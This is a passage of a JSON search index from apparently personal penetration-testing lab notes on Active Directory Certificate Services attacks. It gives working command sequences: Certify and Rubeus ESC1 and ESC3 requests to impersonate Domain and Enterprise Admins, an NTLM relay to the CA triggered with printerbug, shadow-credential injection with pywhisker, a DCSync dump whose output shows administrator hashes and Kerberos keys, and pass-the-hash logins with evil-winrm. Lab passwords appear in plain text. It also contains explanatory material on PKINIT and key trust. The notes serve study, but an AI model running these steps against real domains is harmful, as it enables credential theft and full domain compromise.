Final One-Line Summary","c":"Pass-the-Certificate works by using a valid certificate and its private key to authenticate via Kerberos (PKINIT) or TLS (Schannel), allowing full access without needing a password."},{"id":"windows-poc","u":"01_attacks-lateral-movement.html#windows-poc","sec":"Attacks + Lateral Movement","lvl":3,"t":"Windows PoC","c":""},{"id":"priv-esc---across-domain-trusts---ad-cs","u":"01_attacks-lateral-movement.html#priv-esc---across-domain-trusts---ad-cs","sec":"Attacks + Lateral Movement","lvl":2,"t":"Priv Esc - Across domain trusts - AD CS","c":"image.png image.png image.png"},{"id":"commads-","u":"01_attacks-lateral-movement.html#commads-","sec":"Attacks + Lateral Movement","lvl":4,"t":"Commads:-","c":""},{"id":"what-is-certify","u":"01_attacks-lateral-movement.html#what-is-certify","sec":"Attacks + Lateral Movement","lvl":2,"t":"🔧 What is Certify ?","c":"Certify is a post-exploitation tool from GhostPack (the same creators of Rubeus, Seatbelt, etc.). It is used to enumerate, assess, and abuse AD CS configurations in a Windows domain, especially by red teamers and attackers. list all Certificate Authorities (CAs) in the current domain/forest. Certify.exe cas"},{"id":"what-you-get","u":"01_attacks-lateral-movement.html#what-you-get","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔎 What you get:","c":"The hostname of each CA server The CA name If it’s online or offline Whether enrollment is enabled Basic info like CA DNS name, cert validity, etc."},{"id":"why-its-important","u":"01_attacks-lateral-movement.html#why-its-important","sec":"Attacks + Lateral Movement","lvl":3,"t":"📌 Why it’s important:","c":"You need to know which CAs exist in the domain before you can assess or exploit certificate templates or misconfigurations. image.png image.png Now, to abuse any kind of attack, following setting should always be enabled, however by default it is always enabled. image.png This setting(first row) allows normal user to interact(enroll for certificate) from the CA, however next 3 rows are for privilege users E numerating all certificate templates that are published by the CA(s). Certify.exe find"},{"id":"purpose","u":"01_attacks-lateral-movement.html#purpose","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ Purpose:","c":"This command enumerates all certificate templates that are published by the CA(s)."},{"id":"what-you-get-1","u":"01_attacks-lateral-movement.html#what-you-get-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔎 What you get:","c":"Template name (e.g., User , WebServer , MachineAuth ) Who can enroll (users/groups) Allowed authentication types Template settings (e.g., Can it be used for client authentication? ) EKUs (Extended Key Usages) Auto-enrollment status Whether the template allows user-supplied Subject Alternative Name (SAN)"},{"id":"why-its-important-1","u":"01_attacks-lateral-movement.html#why-its-important-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"📌 Why it’s important:","c":"This helps identify what types of certificates users and machines can request. Some templates may be insecurely configured , allowing abuse. image.png image.png Searching for vulnerable certificate templates that can be abused for privilege escalation or impersonation. Certify.exe find /vulnerable Note:- This command only shows those template where normal identity(specific user) has enrollment rights"},{"id":"what-you-get-2","u":"01_attacks-lateral-movement.html#what-you-get-2","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔎 What you get:","c":"Certify flags templates that meet known vulnerability criteria , such as: Misconfiguration | Risk | — | — | ESC1 | Users can request certs with Client Authentication and supply arbitrary SAN | ESC2 | Template allows enrollment by low-privileged users and issues certs for logon | ESC3 | Enrollment agent abuse | ESC6 | The template allows cert issuance for any user | … | … | It will output: Template name Why it’s vulnerable (e.g., ESC1/ESC6/etc.) Who can enroll Key usage and EKUs If you can supply custom SAN"},{"id":"why-its-important-2","u":"01_attacks-lateral-movement.html#why-its-important-2","sec":"Attacks + Lateral Movement","lvl":3,"t":"📌 Why it’s important:","c":"This is the most important command for identifying paths to domain privilege escalation via AD CS. image.png The above templete( HTTPSCertificate ) is vulnerabile to ENROLLE_SUPPLIES_SUBJECT which belongs to ESC1, which allows to request certificate for any user(including domain admins) for HTTPSCertificate . This request can be made any user who belongs to RDPUser group(all the student user by default belongs to this group) and this certificate can be used for client authentication(mentioned in pkiextendedkeyusage) i.e TGT can be requested for any user. In the Moneycorp environment, AD CS has multiple misconfigurations that allow escalation using ESC1 and ESC3 attack paths. The common issues include: 🔓 Low-privileged users are allowed to enroll for certificates (both at the CA level and template level). ❌ No manager approval is required to issue certificates(usually true for most of the templates). 🚫 No authorization signatures are needed. 📄 The target certificate templates are insecurely configured to allow low-privileged users to request certs. These misconfigs make it easy for attackers to request certificates that can be used for privilege escalation or impersonation within the domain."},{"id":"summary-of-escalation-techniques-used","u":"01_attacks-lateral-movement.html#summary-of-escalation-techniques-used","sec":"Attacks + Lateral Movement","lvl":2,"t":"🔐 Summary of Escalation Techniques Used","c":"There are two primary attack paths shown here: ESC3 – Abuse of Certificate Request Agent template to enroll on behalf of another user (e.g., Domain Admin). ESC1 – Abuse of templates that allow enrollees to supply subject names (SANs) to impersonate privileged users. Let’s go step-by-step:"},{"id":"background-ad-cs-cross-domain-trust","u":"01_attacks-lateral-movement.html#background-ad-cs-cross-domain-trust","sec":"Attacks + Lateral Movement","lvl":2,"t":"🔥 BACKGROUND: AD CS + Cross-Domain Trust","c":"You’re in a forest like dcorp.local and trying to escalate privileges across a trust into moneycorp.local . The target ( moneycorp ) has vulnerable certificate templates and CA configuration, allowing you to request certificates that impersonate high-privileged users like Domain Admins (DA) or Enterprise Admins (EA)."},{"id":"esc3-exploiting-certificate-request-agent-misconfiguration","u":"01_attacks-lateral-movement.html#esc3-exploiting-certificate-request-agent-misconfiguration","sec":"Attacks + Lateral Movement","lvl":2,"t":"🔓 ESC3 — Exploiting Certificate Request Agent Misconfiguration","c":""},{"id":"vulnerability-1","u":"01_attacks-lateral-movement.html#vulnerability-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧩 Vulnerability:","c":"The SmartCardEnrollment-Agent template allows low-privileged users to enroll for agent certificates (intended to request certs on behalf of others). No manager approval or extra signatures required. The SmartCardEnrollment-Users template allows Smartcard-style logon certificates to be requested on behalf of other users ."},{"id":"step-1-request-a-certificate-request-agent-cert","u":"01_attacks-lateral-movement.html#step-1-request-a-certificate-request-agent-cert","sec":"Attacks + Lateral Movement","lvl":3,"t":"➤ STEP 1: Request a Certificate Request Agent cert","c":"Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent You request a certificate from the CA using the SmartCardEnrollment-Agent template. This gives you a cert that lets you act on behalf of other users . You receive: cert.pem (certificate file)"},{"id":"step-2-convert-the-certificate-to-pfx","u":"01_attacks-lateral-movement.html#step-2-convert-the-certificate-to-pfx","sec":"Attacks + Lateral Movement","lvl":3,"t":"➤ STEP 2: Convert the certificate to PFX","c":"Convert cert.pem + private key into esc3agent.pfx (this format is required by Rubeus and Certify) openssl pkcs12 -export -out esc3agent.pfx -inkey key.pem -in cert.pem This certificate can now be used to request certificates on behalf of others ."},{"id":"step-3-request-a-certificate-for-domain-admin-da-using-your-agent-cert","u":"01_attacks-lateral-movement.html#step-3-request-a-certificate-for-domain-admin-da-using-your-agent-cert","sec":"Attacks + Lateral Movement","lvl":3,"t":"➤ STEP 3: Request a certificate for Domain Admin (DA) using your agent cert","c":"Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA \\ /template:SmartCardEnrollment-Users \\ /onbehalfof:dcorp\\administrator \\ /enrollcert:esc3agent.pfx \\ /enrollcertpw:SecretPass@123 You impersonate the DA ( dcorp\\administrator ) You use your agent cert ( esc3agent.pfx ) to make the request This gives you a certificate for the DA account . You receive: cert.pem → Convert to esc3user-DA.pfx"},{"id":"step-4-request-a-tgt-kerberos-ticket-for-da","u":"01_attacks-lateral-movement.html#step-4-request-a-tgt-kerberos-ticket-for-da","sec":"Attacks + Lateral Movement","lvl":3,"t":"➤ STEP 4: Request a TGT (Kerberos Ticket) for DA","c":"Rubeus.exe asktgt /user:administrator /certificate:esc3user-DA.pfx /password:SecretPass@123 /ptt You now get a TGT for DA using the certificate. /ptt = Pass The Ticket — it directly injects the ticket into your session. 🎯 You are now Domain Admin ."},{"id":"escalation-to-enterprise-admin-ea-same-concept","u":"01_attacks-lateral-movement.html#escalation-to-enterprise-admin-ea-same-concept","sec":"Attacks + Lateral Movement","lvl":2,"t":"🔥 Escalation to Enterprise Admin (EA) (Same concept)","c":"Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA \\ /template:SmartCardEnrollment-Users \\ /onbehalfof:moneycorp.local\\administrator \\ /enrollcert:esc3agent.pfx \\ /enrollcertpw:SecretPass@123 Then: Rubeus.exe asktgt /user:moneycorp.local\\administrator \\ /certificate:esc3user.pfx /dc:mcorp-dc.moneycorp.local \\ /password:SecretPass@123 /ptt 🎯 You now impersonate EA from moneycorp domain."},{"id":"esc1-enrollee-supplies-subject-misconfiguration","u":"01_attacks-lateral-movement.html#esc1-enrollee-supplies-subject-misconfiguration","sec":"Attacks + Lateral Movement","lvl":2,"t":"🔥 ESC1 — Enrollee Supplies Subject Misconfiguration","c":""},{"id":"vulnerability-2","u":"01_attacks-lateral-movement.html#vulnerability-2","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧩 Vulnerability:","c":"HTTPSCertificates template has ENROLLEE_SUPPLIES_SUBJECT flag set (meaning: you can specify any subject, including a different user). Normal users can enroll and supply /altname:administrator"},{"id":"step-1-find-the-template","u":"01_attacks-lateral-movement.html#step-1-find-the-template","sec":"Attacks + Lateral Movement","lvl":3,"t":"➤ STEP 1: Find the template","c":"Certify.exe find /enrolleeSuppliesSubject This shows HTTPSCertificates is vulnerable."},{"id":"step-2-request-a-certificate-for-administrator","u":"01_attacks-lateral-movement.html#step-2-request-a-certificate-for-administrator","sec":"Attacks + Lateral Movement","lvl":3,"t":"➤ STEP 2: Request a certificate for administrator","c":"Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA \\ /template:\"HTTPSCertificates\" /altname:administrator As a low-priv user (e.g., studentx ), you request a certificate for the administrator Because of misconfig, CA allows it. Result: You get cert.pem → Convert to esc1.pfx"},{"id":"step-3-use-rubeus-to-get-da-tgt","u":"01_attacks-lateral-movement.html#step-3-use-rubeus-to-get-da-tgt","sec":"Attacks + Lateral Movement","lvl":3,"t":"➤ STEP 3: Use Rubeus to get DA TGT","c":"Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx \\ /password:SecretPass@123 /ptt 🎯 You are now DA."},{"id":"summary-table-2","u":"01_attacks-lateral-movement.html#summary-table-2","sec":"Attacks + Lateral Movement","lvl":3,"t":"📌 Summary Table","c":"Attack | Misconfig | Tools | Priv Gained | — | — | — | — | ESC1 | Enrollee supplies subject | Certify + Rubeus | DA/EA | ESC3 | Request agent can request on behalf | Certify + Rubeus | DA/EA | Let me know if you want diagrams or simplified step-by-step flow!"},{"id":"why-this-works","u":"01_attacks-lateral-movement.html#why-this-works","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧠 Why This Works","c":"These attacks succeed because of: Misconfigured certificate templates (allowing low-priv users to enroll or impersonate). No need for manager approval or authorization . Certificates are accepted by the KDC for Kerberos authentication (PKINIT) ."},{"id":"exploitation-scenario","u":"01_attacks-lateral-movement.html#exploitation-scenario","sec":"Attacks + Lateral Movement","lvl":3,"t":"Exploitation Scenario:","c":"image.png Part one has been already cover above where we have found HTTPSCertificate template is vulnerable to ESC1 Covering Part2:- If we want look for specific template like ENROLLEE_SUPPLIES_SUBJECT which is ESC1, then we run following command; Certify.exe find /enrolleeSuppliesSubject image.png image.png After running the command we will get many template but we have look for only those template where we have enrollment rights, for above example enrollment right only belongs to Domain Admins so we will skip this. image.png for above template we have enrollment right so we will target this template. As the student users are part of RDPusers group. pkiextendedkeyusage - this attributes tells for what purpose this certificate can be used for image.png by abusing this templete we can request from HTTPSCertificates for any user(even for domain admins) and use that certificate for client authentication i.e request TGT for that user . Step1:- Requesting Certificate C:\\AD\\Tools\\Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:\"HTTPSCertificates\" /altname:administrator Same as above:- C:\\AD\\Tools\\Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:\"HTTPSCertificates\" /altname:administrator This request certificate for HTTPSCertificates for administrator as a normal rdpuser(student). image.png image.png copy this certificate and save to a text file with extension .pem image.png Step2:- Converting file from . pem to .pfx Now you tool suggests that use openssl to convert file from . pem to .pfx image.png Run the following command for converting .pem file to .pfx using openssl. Convert cert.pem + private key into esc3agent.pfx (this format is required by Rubeus and Certify) C:\\AD\\Tools\\openssl\\openssl.exe pkcs12 -in <Path_to_save_file> -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out <path_and_filename> Example:- C:\\AD\\Tools\\openssl\\openssl.exe pkcs12 -in C:\\AD\\Tools\\esc1.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out C:\\AD\\Tools\\esc1-DA.pfx image.png and it will ask for password, use any password but remember it. Step3:- Using rubeus to request TGT of administrator: C:\\AD\\Tools\\Rubeus.exe asktgt /user:administrator /certificate:C:\\AD\\Tools\\esc1.pfx /password:pass@123 /ptt pass@123 -> is the password which we set while converting the file in previous step image.png image.png Running klist to verify whether the TGT has been successfully imported into current user session: image.png Now we can access any service on behalf of domain administrator. winrs -r:dcopr-dc cmd /c set username Now requesting certificate of enterprise admin: the only difference in command is that we are specifying that we are requesting certificate for forest administrator which is enterprise admin(* altname: ) Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA \\ /template:\"HTTPSCertificates\" /altname:moneycorp.local\\administrator image.png image.png From here on wards all the steps are same as previous one. convert file from . pem to .pfx image.png Requesting TGT for enterprise administrator. Rubeus.exe asktgt /user:<forestname>\\administrator /dc:<dc-name> /certificate:esc1.pfx \\ /password:SecretPass@123 /ptt here just you have to specify for which administrator you are request tgt and its domain controller image.png image.png"},{"id":"pass-the-certificate-2","u":"01_attacks-lateral-movement.html#pass-the-certificate-2","sec":"Attacks + Lateral Movement","lvl":3,"t":"Pass the Certificate","c":"Step 1 - access the certificate server http://10.129.234.172/certsrv/certfnsh.asp wwhite:package5shores_topher1 image.png Step 2 - start the listener using ntmlrelayx impacket-ntlmrelayx -t http://10.129.234.172/certsrv/certfnsh.asp –adcs -smb2support –template KerberosAuthentication image.png Step 3 - Trigger Authentication for getting the dc certificate python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:“ package5shores_topher1” @10.129.234.174 10.10.17.180 image.png Step 4 - ask for TGT for domain machine using the valid domain certificate python3 gettgtpkinit.py -cert-pfx DC01$.pfx -dc-ip 10.129.234.174 ‘inlanefreight.local/dc01$’ /tmp/dc.ccache 2025-07-07 10:11:15,603 minikerberos INFO Loading certificate and key from file INFO:minikerberos:Loading certificate and key from file 2025-07-07 10:11:16,115 minikerberos INFO Requesting TGT INFO:minikerberos:Requesting TGT 2025-07-07 10:11:28,449 minikerberos INFO AS-REP encryption key (you might need this later): INFO:minikerberos:AS-REP encryption key (you might need this later): 2025-07-07 10:11:28,453 minikerberos INFO 4e998cf4ad0dd1e7b7a4e49457d8d727e736bccfdf069e9902271ab66a2c0e18 INFO:minikerberos:4e998cf4ad0dd1e7b7a4e49457d8d727e736bccfdf069e9902271ab66a2c0e18 2025-07-07 10:11:28,463 minikerberos INFO Saved TGT to file INFO:minikerberos:Saved TGT to file image.png image.png Step 5 - export the TGT from the tmp file export KRB5CCNAME=/tmp/dc.ccache image.png Step 6 - check on env whether its set or not image.png Step 7 - use klist for checking current TGT user klist image.png Step 8 - add it on hosts file image.png Step 9 - since we have the domain machine TGT we can now ask for administrator credentials ( hashes ) impacket-secretsdump -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator ‘INLANEFREIGHT.LOCAL/DC01$’ @DC01.INLANEFREIGHT.LOCAL [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:ec2223ff4c0bce238aa04d30be0fe9e634495f9449c0c25307c66d7c12d8f93a Administrator:aes128-cts-hmac-sha1-96:ffb8855b50dd1bf538c8001620c4f1d1 Administrator:des-cbc-md5:a1f262b50b64c46b image.png Step 10 - RBCD Chain attack python3 pywhisker.py –dc-ip 10.129.234.174 -d INLANEFREIGHT.LOCAL -u wwhite -p ‘package5shores_topher1’ –target jpinkman –action add [*] Searching for the target account [*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local [*] Generating certificate [*] Certificate generated [*] Generating KeyCredential [*] KeyCredential generated with DeviceID: c8ea8798-6e42-4da0-da0d-9ae6ef71aefe [*] Updating the msDS-KeyCredentialLink attribute of jpinkman [+] Updated the msDS-KeyCredentialLink attribute of the target object [*] Converting PEM -> PFX with cryptography: zyo2wrxR.pfx [+] PFX exportiert nach: zyo2wrxR.pfx [i] Passwort für PFX: tHzcNOe5sojsKP5eCE8n [+] Saved PFX (#PKCS12) certificate & key at path: zyo2wrxR.pfx [*] Must be used with password: tHzcNOe5sojsKP5eCE8n [*] A TGT can now be obtained with [https://github.com/dirkjanm/PKINITtools](https://github.com/dirkjanm/PKINITtools) image.png Step 11 - get TGT of jpinkman user python3 gettgtpkinit.py -cert-pfx zyo2wrxR.pfx -pfx-pass ‘tHzcNOe5sojsKP5eCE8n’ -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache image.png Step 12 - export the TGT and check using klist export KRB5CCNAME=/tmp/jpinkman.ccache klist image.png Step 13 - make changes in the /etc/krb5.conf file image.png image.png image.png Step 14 - login using winrm tool for accessing jpinkman account evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local image.png Step 15 - login to admin using its hash found earlier evil-winrm -i 10.129.234.174 -u Administrator -H fd02e525dd676fd8ca04e200d265f20c image.png"},{"id":"pass-the-certificate-working","u":"01_attacks-lateral-movement.html#pass-the-certificate-working","sec":"Attacks + Lateral Movement","lvl":3,"t":"Pass the Certificate Working","c":""},{"id":"step-by-step-guide","u":"01_attacks-lateral-movement.html#step-by-step-guide","sec":"Attacks + Lateral Movement","lvl":2,"t":"🧭 Step-by-Step Guide","c":""},{"id":"step-1-identify-roles-of-ips","u":"01_attacks-lateral-movement.html#step-1-identify-roles-of-ips","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ Step 1: Identify Roles of IPs","c":"From your context: 10.129.234.109 = DC (Domain Controller) 10.129.234.110 = AD CS Web Enrollment (CertSrv) You’ll need to relay auth from the DC to the CA server to request a machine certificate."},{"id":"step-2-start-ntlm-relay-with-ntlmrelayx","u":"01_attacks-lateral-movement.html#step-2-start-ntlm-relay-with-ntlmrelayx","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ Step 2: Start NTLM Relay with ntlmrelayx","c":"bash CopyEdit impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication Keep this window running — it waits for an incoming NTLM authentication to relay."},{"id":"step-3-trigger-authentication-using-printerbug.py","u":"01_attacks-lateral-movement.html#step-3-trigger-authentication-using-printerbug.py","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ Step 3: Trigger Authentication using printerbug.py","c":"bash CopyEdit python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:\"package5shores_topher1\"@10.129.234.109 10.10.16.12 10.10.16.12 is your attacker IP (running ntlmrelayx). If successful, ntlmrelayx will: Relay DC01$’s auth to the CA server. Request and obtain a certificate for DC01$. Save it as DC01$.pfx ."},{"id":"step-4-extract-tgt-using-gettgtpkinit.py","u":"01_attacks-lateral-movement.html#step-4-extract-tgt-using-gettgtpkinit.py","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ Step 4: Extract TGT Using gettgtpkinit.py","c":"Install PKINITtools if not done already: bash CopyEdit git clone https://github.com/dirkjanm/PKINITtools.git cd PKINITtools python3 -m venv .venv && source .venv/bin/activate pip3 install -r requirements.txt Then run: bash CopyEdit python3 gettgtpkinit.py -cert-pfx ../DC01\\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache This gives you a valid TGT for the DC01$ machine account."},{"id":"step-5-dcsync-attack-to-get-administrator-hash","u":"01_attacks-lateral-movement.html#step-5-dcsync-attack-to-get-administrator-hash","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ Step 5: DCSync Attack to Get Administrator Hash","c":"bash CopyEdit export KRB5CCNAME=/tmp/dc.ccache impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL This should give you the NTLM hash of Administrator . Save it for later access."},{"id":"step-6-shadow-credential-attack-on-jpinkman","u":"01_attacks-lateral-movement.html#step-6-shadow-credential-attack-on-jpinkman","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ Step 6: Shadow Credential Attack on jpinkman","c":"bash CopyEdit pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add This command: Generates a certificate. Modifies jpinkman ’s msDS-KeyCredentialLink attribute. Outputs eFUVVTPf.pfx and password."},{"id":"step-7-get-tgt-for-jpinkman","u":"01_attacks-lateral-movement.html#step-7-get-tgt-for-jpinkman","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ Step 7: Get TGT for jpinkman","c":"bash CopyEdit python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache"},{"id":"step-8-access-jpinkmans-desktop-via-evil-winrm","u":"01_attacks-lateral-movement.html#step-8-access-jpinkmans-desktop-via-evil-winrm","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ Step 8: Access jpinkman ’s Desktop via Evil-WinRM","c":"Make sure your /etc/krb5.conf is configured properly with: ini CopyEdit [libdefaults] default_realm = INLANEFREIGHT.LOCAL dns_lookup_realm = false dns_lookup_kdc = true Export the ticket and access the machine: bash CopyEdit export KRB5CCNAME=/tmp/jpinkman.ccache evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local Inside the shell: powershell CopyEdit cd ..\\Desktop type flag.txt ✅ Submit the flag for jpinkman ."},{"id":"step-9-access-administrators-flag","u":"01_attacks-lateral-movement.html#step-9-access-administrators-flag","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ Step 9: Access Administrator ’s Flag","c":"Now use evil-winrm with the NTLM hash obtained earlier. bash CopyEdit evil-winrm -i dc01.inlanefreight.local -u Administrator -H <NTLM_HASH> Then: powershell CopyEdit cd C:\\Users\\Administrator\\Desktop type flag.txt ✅ Submit the flag for Administrator ."},{"id":"shadow-key-credentials-attack","u":"01_attacks-lateral-movement.html#shadow-key-credentials-attack","sec":"Attacks + Lateral Movement","lvl":2,"t":"Shadow Key Credentials Attack","c":""},{"id":"understanding-the-working","u":"01_attacks-lateral-movement.html#understanding-the-working","sec":"Attacks + Lateral Movement","lvl":3,"t":"Understanding The Working","c":""},{"id":"introduction-to-kerberos-authentication","u":"01_attacks-lateral-movement.html#introduction-to-kerberos-authentication","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 Introduction to Kerberos Authentication","c":"Active Directory uses Kerberos (trusted authentication protocol) ✔️ Verifies identity of users and services ✔️ Uses tickets (avoids sending passwords over network)"},{"id":"symmetric-encryption-in-kerberos","u":"01_attacks-lateral-movement.html#symmetric-encryption-in-kerberos","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔑 Symmetric Encryption in Kerberos","c":"📌 Traditional Kerberos uses symmetric encryption 🔄 Authentication Flow 1️⃣ AS-REQ (Authentication Service Request) Client → KDC Includes: ⏱️ Timestamp 🔒 Encrypted using key derived from user’s password 2️⃣ AS-REP (Authentication Service Response) KDC: ✔️ Validates timestamp using stored hash 🎟️ Issues TGT (Ticket Granting Ticket) 🔐 Encrypted with KDC’s secret key 3️⃣ TGS-REQ & TGS-REP Client uses TGT Requests access to service KDC returns: 🎫 Service Ticket ⚠️ Limitation ❌ Depends on shared secrets (passwords) ❌ Not suitable for PKI-based authentication (e.g., smart cards)"},{"id":"asymmetric-encryption-with-pkinit","u":"01_attacks-lateral-movement.html#asymmetric-encryption-with-pkinit","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 Asymmetric Encryption with PKINIT","c":""},{"id":"pkinit-public-key-cryptography-for-initial-authentication","u":"01_attacks-lateral-movement.html#pkinit-public-key-cryptography-for-initial-authentication","sec":"Attacks + Lateral Movement","lvl":4,"t":"📌 PKINIT (Public Key Cryptography for Initial Authentication)","c":"Extension of Kerberos ✔️ Uses public-private key pairs ✔️ Removes dependency on passwords"},{"id":"pkinit-certificate-authentication","u":"01_attacks-lateral-movement.html#pkinit-certificate-authentication","sec":"Attacks + Lateral Movement","lvl":4,"t":"🪪 PKINIT Certificate Authentication","c":"Uses: 📜 X.509 Certificate 🔑 Private Key ✔️ KDC directly validates the certificate"},{"id":"pkinit-key-trust","u":"01_attacks-lateral-movement.html#pkinit-key-trust","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔗 PKINIT Key Trust","c":"Uses: 🧾 msDS-KeyCredentialLink attribute in AD ✔️ Stores public keys linked to user"},{"id":"working-flow","u":"01_attacks-lateral-movement.html#working-flow","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔄 Working Flow","c":"1️⃣ AS-REQ with PKINIT Client → KDC Includes: ⏱️ Timestamp ✍️ Signed using private key 🔓 Public key 2️⃣ Public Key Validation KDC checks: 🔍 Public key in request 🔗 Matches with: msDS-KeyCredentialLink ✔️ If match: Decrypts timestamp Verifies signature 3️⃣ AS-REP ✔️ If validation successful 🎟️ KDC issues TGT"},{"id":"security-insight","u":"01_attacks-lateral-movement.html#security-insight","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚠️ Security Insight","c":""},{"id":"shadow-credentials-attack","u":"01_attacks-lateral-movement.html#shadow-credentials-attack","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 Shadow Credentials Attack","c":"Uses msDS-KeyCredentialLink ✔️ Adds attacker-controlled public key ✔️ Enables authentication without password ❗ Covert technique ❗ Minimal visibility in traditional SIEM"},{"id":"summary","u":"01_attacks-lateral-movement.html#summary","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎯 Summary","c":"Symmetric Kerberos → Password-based PKINIT → Certificate / Key-based Key Trust → Uses msDS-KeyCredentialLink"},{"id":"understanding-msds-keycredentiallink","u":"01_attacks-lateral-movement.html#understanding-msds-keycredentiallink","sec":"Attacks + Lateral Movement","lvl":3,"t":"Understanding msDS-KeyCredentialLink","c":""},{"id":"the-msds-keycredentiallink-attribute","u":"01_attacks-lateral-movement.html#the-msds-keycredentiallink-attribute","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔗 The msDS-KeyCredentialLink Attribute","c":"📌 Overview Introduced with Windows Server 2016 (PKINIT support) Used to store public keys for authentication Critical for certificate/key-based authentication"},{"id":"key-characteristics-2","u":"01_attacks-lateral-movement.html#key-characteristics-2","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧩 Key Characteristics","c":"1️⃣ Multi-Value Attribute ✔️ Can store multiple public keys ✔️ Represents multiple devices linked to one account 2️⃣ Contains Key Credential Objects Each value includes: 📅 Creation date 🧾 Distinguished Name (DN) of owner 🆔 GUID (Device ID) 🔑 Public key 3️⃣ Used During Authentication Client sends public key during PKINIT KDC checks: msDS-KeyCredentialLink ✔️ If match found → authentication continues 4️⃣ Permission Requirement ❗ Modification requires special permissions: GenericWrite GenericAll Typically held by privileged accounts"},{"id":"how-shadow-credentials-work","u":"01_attacks-lateral-movement.html#how-shadow-credentials-work","sec":"Attacks + Lateral Movement","lvl":4,"t":"🕶️ How Shadow Credentials Work","c":"📌 Concept Exploits weak permissions on: msDS-KeyCredentialLink ✔️ Attacker injects their own public key ✔️ Authenticates as target using PKINIT"},{"id":"attack-flow-step-by-step","u":"01_attacks-lateral-movement.html#attack-flow-step-by-step","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔄 Attack Flow (Step-by-Step)","c":"Step 1: Identify Target Permissions The attacker identifies an Active Directory object (such as a user or computer account) where they have permissions to modify attributes. Permissions like GenericWrite or GenericAll are required to modify the msDS-KeyCredentialLink attribute. Step 2: Inject the Attacker’s Public Key Next, the attacker adds their own public key to the msDS-KeyCredentialLink attribute of the target account. This process essentially “registers” the attacker’s key as a valid authentication method for the target. Step 3: Generate a Certificate The attacker creates a certificate in PFX format using the private key associated with the injected public key. This certificate is now tied to the target account. Step 4: Authenticate as the Target Account With the generated certificate, the attacker authenticates to the domain using PKINIT. The KDC validates the attacker’s public key against the msDS-KeyCredentialLink attribute and issues a Ticket Granting Ticket (TGT) for the target account. Step 5: Impersonate Users or Escalate Privileges Using the TGT, the attacker can: Perform lateral movement within the network. Use the S4U2self protocol to impersonate other users. Extract NTLM hashes from the Privilege Attribute Certificate (PAC)."},{"id":"key-insight","u":"01_attacks-lateral-movement.html#key-insight","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚠️ Key Insight","c":"No password needed No certificate from CA required Only public key injection is enough"},{"id":"summary-1","u":"01_attacks-lateral-movement.html#summary-1","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎯 Summary","c":"Attacker → Injects public key → Generates cert → PKINIT auth → Gets TGT → Becomes target"},{"id":"detection","u":"01_attacks-lateral-movement.html#detection","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔍 Detection","c":"📌 Overview There are two main detection opportunities :"},{"id":"detect-pkinit-based-tgt-requests","u":"01_attacks-lateral-movement.html#detect-pkinit-based-tgt-requests","sec":"Attacks + Lateral 